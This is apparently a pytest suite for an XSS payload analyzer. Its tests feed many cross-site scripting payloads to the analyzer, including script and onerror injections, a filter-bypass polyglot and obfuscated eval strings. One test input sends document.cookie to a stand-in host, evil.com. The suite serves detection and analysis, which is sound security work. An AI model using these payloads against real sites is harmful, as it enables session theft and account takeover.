#!/usr/bin/env python3
"""
Tests for XSS Payload Analyzer

This test suite validates the payload analyzer functionality including
context detection, XSS type identification, bypass technique recognition,
and risk assessment calculations.

Test Categories:
- Unit tests for individual analyzer methods
- Integration tests for complete payload analysis
- Edge case testing for malformed/unusual payloads
- Performance tests for large payload sets
"""

import pytest
import sys
import os

# Add the parent directory to the path so we can import the modules
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.payload_analyzer import (
    PayloadAnalyzer, PayloadAnalysis, XSSType, Context
)


class TestPayloadAnalyzer:
    """Test cases for the PayloadAnalyzer class"""
    
    @pytest.fixture
    def analyzer(self):
        """Create a PayloadAnalyzer instance for testing"""
        return PayloadAnalyzer()
    
    def test_analyzer_initialization(self, analyzer):
        """Test that the analyzer initializes with required components"""
        assert analyzer.script_tags
        assert analyzer.event_handlers
        assert analyzer.bypass_patterns
        assert analyzer.dom_sources
        assert analyzer.dom_sinks
        assert analyzer.dangerous_functions
    
    def test_basic_script_tag_analysis(self, analyzer):
        """Test analysis of basic script tag payload"""
        payload = '<script>alert("XSS")</script>'
        analysis = analyzer.analyze_payload(payload)
        
        assert isinstance(analysis, PayloadAnalysis)
        assert analysis.payload == payload
        assert Context.HTML_CONTENT in analysis.contexts
        assert XSSType.REFLECTED in analysis.xss_types
        assert analysis.risk_level in ["medium", "high", "critical"]
        assert "script" in analysis.detected_tags
        assert analysis.risk_score > 0
    
    def test_image_onerror_analysis(self, analyzer):
        """Test analysis of image onerror payload"""
        payload = '<img src=x onerror=alert("XSS")>'
        analysis = analyzer.analyze_payload(payload)
        
        assert Context.HTML_CONTENT in analysis.contexts
        assert Context.ATTRIBUTE_VALUE in analysis.contexts
        assert XSSType.UNIVERSAL in analysis.xss_types
        assert "img" in analysis.detected_tags
        assert "onerror" in analysis.detected_events
        assert analysis.risk_level in ["medium", "high", "critical"]
    
    def test_javascript_protocol_analysis(self, analyzer):
        """Test analysis of javascript protocol payload"""
        payload = 'javascript:alert("XSS")'
        analysis = analyzer.analyze_payload(payload)
        
        assert Context.URL_PARAMETER in analysis.contexts
        assert XSSType.REFLECTED in analysis.xss_types
        assert "protocol_confusion" in analysis.bypass_techniques
        assert analysis.risk_score > 0
    
    def test_context_detection(self, analyzer):
        """Test context detection for various payload types"""
        test_cases = [
            ('<script>alert(1)</script>', Context.HTML_CONTENT),
            ('" onclick=alert(1) "', Context.ATTRIBUTE_VALUE),
            ('"; alert(1); "', Context.JAVASCRIPT_STRING),
            ('expression(alert(1))', Context.CSS_VALUE),
            ('<!--"><script>alert(1)</script>', Context.HTML_COMMENT),
            ('eval(location.hash)', Context.SCRIPT_CONTENT)
        ]
        
        for payload, expected_context in test_cases:
            analysis = analyzer.analyze_payload(payload)
            assert expected_context in analysis.contexts, f"Failed for payload: {payload}"
    
    def test_xss_type_detection(self, analyzer):
        """Test XSS type detection"""
        test_cases = [
            ('<script>alert(1)</script>', XSSType.REFLECTED),
            ('<img src=x onerror=alert(1)>', XSSType.UNIVERSAL),
            ('document.write(location.search)', XSSType.DOM_BASED),
            ('setTimeout(location.hash.substr(1),1)', XSSType.DOM_BASED),
            ('fetch("//evil.com/?"+document.cookie)', XSSType.BLIND)
        ]
        
        for payload, expected_type in test_cases:
            analysis = analyzer.analyze_payload(payload)
            assert expected_type in analysis.xss_types, f"Failed for payload: {payload}"
    
    def test_bypass_technique_detection(self, analyzer):
        """Test bypass technique identification"""
        test_cases = [
            ('<ScRiPt>alert(1)</ScRiPt>', 'case_variation'),
            ('&#97;&#108;&#101;&#114;&#116;', 'encoded_chars'),
            ('\\u0061\\u006c\\u0065\\u0072\\u0074', 'unicode_encoding'),
            ('javascript:alert(1)', 'protocol_confusion'),
            ('/**/alert/**/1/**/', 'comment_breaking'),
            ('<img/src=x/onerror=alert(1)>', 'whitespace_abuse'),
            ('String.fromCharCode(97,108,101,114,116)', 'string_methods')
        ]
        
        for payload, expected_technique in test_cases:
            analysis = analyzer.analyze_payload(payload)
            assert expected_technique in analysis.bypass_techniques, f"Failed for payload: {payload}"
    
    def test_html_tag_detection(self, analyzer):
        """Test HTML tag detection"""
        test_cases = [
            ('<script>alert(1)</script>', 'script'),
            ('<img src=x onerror=alert(1)>', 'img'),
            ('<svg onload=alert(1)>', 'svg'),
            ('<iframe src="javascript:alert(1)">', 'iframe'),
            ('<video><source onerror="alert(1)"></video>', 'video')
        ]
        
        for payload, expected_tag in test_cases:
            analysis = analyzer.analyze_payload(payload)
            assert expected_tag in analysis.detected_tags, f"Failed for payload: {payload}"
    
    def test_event_handler_detection(self, analyzer):
        """Test event handler detection"""
        test_cases = [
            ('<img src=x onerror=alert(1)>', 'onerror'),
            ('<body onload=alert(1)>', 'onload'),
            ('<input onfocus=alert(1)>', 'onfocus'),
            ('<div onclick=alert(1)>', 'onclick'),
            ('<svg onmouseover=alert(1)>', 'onmouseover')
        ]
        
        for payload, expected_event in test_cases:
            analysis = analyzer.analyze_payload(payload)
            assert expected_event in analysis.detected_events, f"Failed for payload: {payload}"
    
    def test_encoding_detection(self, analyzer):
        """Test encoding detection"""
        test_cases = [
            ('&#97;&#108;&#101;&#114;&#116;', 'html_decimal'),
            ('&#x61;&#x6c;&#x65;&#x72;&#x74;', 'html_hexadecimal'),
            ('%61%6c%65%72%74', 'url_encoding'),
            ('\\u0061\\u006c\\u0065\\u0072\\u0074', 'unicode_escape'),
            ('\\x61\\x6c\\x65\\x72\\x74', 'hex_escape'),
            ('String.fromCharCode(97,108,101,114,116)', 'char_code')
        ]
        
        for payload, expected_encoding in test_cases:
            analysis = analyzer.analyze_payload(payload)
            assert expected_encoding in analysis.encoding_used, f"Failed for payload: {payload}"
    
    def test_risk_score_calculation(self, analyzer):
        """Test risk score calculation logic"""
        # High risk payload
        high_risk = '<script>eval(document.cookie)</script>'
        high_analysis = analyzer.analyze_payload(high_risk)
        
        # Low risk payload
        low_risk = 'test'
        low_analysis = analyzer.analyze_payload(low_risk)
        
        assert high_analysis.risk_score > low_analysis.risk_score
        assert high_analysis.risk_level in ["high", "critical"]
        assert low_analysis.risk_level == "low"
    
    def test_risk_level_assignment(self, analyzer):
        """Test risk level assignment based on scores"""
        # Test score to level mapping
        test_cases = [
            (95, "critical"),
            (75, "high"),
            (45, "medium"),
            (15, "low")
        ]
        
        for score, expected_level in test_cases:
            level = analyzer._determine_risk_level(score)
            assert level == expected_level
    
    def test_proof_of_concept_generation(self, analyzer):
        """Test proof of concept generation"""
        payload = '<script>alert("XSS")</script>'
        analysis = analyzer.analyze_payload(payload)
        
        assert analysis.proof_of_concept
        assert "PROOF OF CONCEPT" in analysis.proof_of_concept
        assert payload in analysis.proof_of_concept
        assert "WARNING" in analysis.proof_of_concept
    
    def test_explanation_generation(self, analyzer):
        """Test explanation generation"""
        payload = '<img src=x onerror=alert(1)>'
        analysis = analyzer.analyze_payload(payload)
        
        assert analysis.explanation
        assert "XSS Payload Analysis" in analysis.explanation
        assert str(len(payload)) in analysis.explanation
        assert "img" in analysis.explanation
        assert "onerror" in analysis.explanation
    
    def test_payload_normalization(self, analyzer):
        """Test payload normalization"""
        # Test HTML entity decoding
        encoded_payload = '&lt;script&gt;alert(1)&lt;/script&gt;'
        normalized = analyzer._normalize_payload(encoded_payload)
        assert '<script>' in normalized.lower()
        
        # Test URL decoding
        url_encoded = '%3Cscript%3Ealert(1)%3C/script%3E'
        normalized = analyzer._normalize_payload(url_encoded)
        assert '<script>' in normalized.lower()
    
    def test_bypass_suggestions(self, analyzer):
        """Test bypass suggestion generation"""
        payload = '<script>alert(1)</script>'
        analysis = analyzer.analyze_payload(payload)
        
        assert analysis.potential_bypasses
        assert len(analysis.potential_bypasses) > 0
        
        # Should suggest case variation for script tag
        case_suggestions = [s for s in analysis.potential_bypasses if "case" in s.lower()]
        assert len(case_suggestions) > 0
    
    def test_multiple_payload_analysis(self, analyzer):
        """Test analysis of multiple payloads"""
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
            'invalid payload'
        ]
        
        analyses = analyzer.analyze_multiple_payloads(payloads)
        
        assert len(analyses) == len(payloads)
        assert all(isinstance(a, PayloadAnalysis) for a in analyses)
        
        # Should be sorted by risk score (highest first)
        risk_scores = [a.risk_score for a in analyses]
        assert risk_scores == sorted(risk_scores, reverse=True)
    
    def test_edge_cases(self, analyzer):
        """Test edge cases and malformed payloads"""
        edge_cases = [
            '',  # Empty payload
            '   ',  # Whitespace only
            '<' * 1000,  # Very long payload
            'normal text',  # Non-XSS text
            '<script></script>',  # Empty script tag
            '<<>><script>alert(1)</script>',  # Malformed HTML
            'alert(1)',  # JavaScript without HTML context
        ]
        
        for payload in edge_cases:
            analysis = analyzer.analyze_payload(payload)
            assert isinstance(analysis, PayloadAnalysis)
            assert analysis.payload == payload
            assert isinstance(analysis.risk_score, int)
            assert 0 <= analysis.risk_score <= 100
            assert analysis.risk_level in ["low", "medium", "high", "critical"]
    
    def test_dom_xss_detection(self, analyzer):
        """Test DOM-based XSS detection"""
        dom_payloads = [
            'document.write(location.search)',
            'eval(location.hash.substr(1))',
            'innerHTML = document.URL',
            'setTimeout(window.name, 100)',
            'Function(location.search)()'
        ]
        
        for payload in dom_payloads:
            analysis = analyzer.analyze_payload(payload)
            assert XSSType.DOM_BASED in analysis.xss_types
            assert Context.SCRIPT_CONTENT in analysis.contexts
    
    def test_polyglot_payload_analysis(self, analyzer):
        """Test analysis of polyglot payloads"""
        polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//'
        analysis = analyzer.analyze_payload(polyglot)
        
        # Should detect multiple contexts
        assert len(analysis.contexts) > 1
        
        # Should detect multiple bypass techniques
        assert len(analysis.bypass_techniques) > 3
        
        # Should be high risk
        assert analysis.risk_level in ["high", "critical"]
        assert analysis.risk_score > 50
    
    def test_obfuscated_payload_analysis(self, analyzer):
        """Test analysis of obfuscated payloads"""
        obfuscated_payloads = [
            'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
            'eval(atob("YWxlcnQoMSk="))',  # Base64 encoded alert(1)
            'this[\\x61\\x6c\\x65\\x72\\x74](1)',
            'top[8680439..toString(30)](1337)',
            '[]["sort"]["constructor"]("alert(1)")()'
        ]
        
        for payload in obfuscated_payloads:
            analysis = analyzer.analyze_payload(payload)
            assert len(analysis.bypass_techniques) > 0
            assert analysis.risk_score > 20  # Should still be detected as risky
    
    def test_report_generation(self, analyzer):
        """Test report generation for multiple analyses"""
        payloads = [
            '<script>alert("critical")</script>',
            '<img src=x onerror=alert("high")>',
            'javascript:alert("medium")',
            'normal text'
        ]
        
        analyses = analyzer.analyze_multiple_payloads(payloads)
        report = analyzer.generate_report(analyses)
        
        assert "XSS PAYLOAD ANALYSIS REPORT" in report
        assert "Total Payloads Analyzed" in report
        assert "TOP RISK PAYLOADS" in report
        assert "COMMON BYPASS TECHNIQUES" in report
        
        # Should include statistics
        assert str(len(payloads)) in report
    
    def test_performance_with_large_payload_set(self, analyzer):
        """Test performance with a large set of payloads"""
        import time
        
        # Generate a large set of similar payloads
        payloads = [f'<script>alert({i})</script>' for i in range(100)]
        
        start_time = time.time()
        analyses = analyzer.analyze_multiple_payloads(payloads)
        execution_time = time.time() - start_time
        
        assert len(analyses) == 100
        assert execution_time < 10.0  # Should complete within 10 seconds
        
        # All should be analyzed correctly
        assert all(a.risk_level in ["medium", "high", "critical"] for a in analyses)
    
    def test_unicode_handling(self, analyzer):
        """Test handling of Unicode characters in payloads"""
        unicode_payloads = [
            '<script>alert("🚨")</script>',
            '<img src=x onerror=alert("测试")>',
            '"><script>alert("עברית")</script>',
            'javascript:alert("العربية")'
        ]
        
        for payload in unicode_payloads:
            analysis = analyzer.analyze_payload(payload)
            assert isinstance(analysis, PayloadAnalysis)
            assert analysis.payload == payload
            assert analysis.risk_score > 0
    
    def test_looks_like_base64_detection(self, analyzer):
        """Test base64 detection utility"""
        assert analyzer._looks_like_base64("YWxlcnQoMSk=")  # alert(1)
        assert analyzer._looks_like_base64("SGVsbG8gV29ybGQ=")  # Hello World
        assert not analyzer._looks_like_base64("not base64")
        assert not analyzer._looks_like_base64("<script>")
        assert not analyzer._looks_like_base64("abc")  # Too short
    
    def test_confidence_scoring_consistency(self, analyzer):
        """Test that confidence scoring is consistent"""
        payload = '<script>alert(1)</script>'
        
        # Run analysis multiple times
        analyses = [analyzer.analyze_payload(payload) for _ in range(5)]
        
        # All analyses should be identical
        first_analysis = analyses[0]
        for analysis in analyses[1:]:
            assert analysis.payload == first_analysis.payload
            assert analysis.risk_score == first_analysis.risk_score
            assert analysis.risk_level == first_analysis.risk_level
            assert analysis.contexts == first_analysis.contexts
            assert analysis.xss_types == first_analysis.xss_types


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])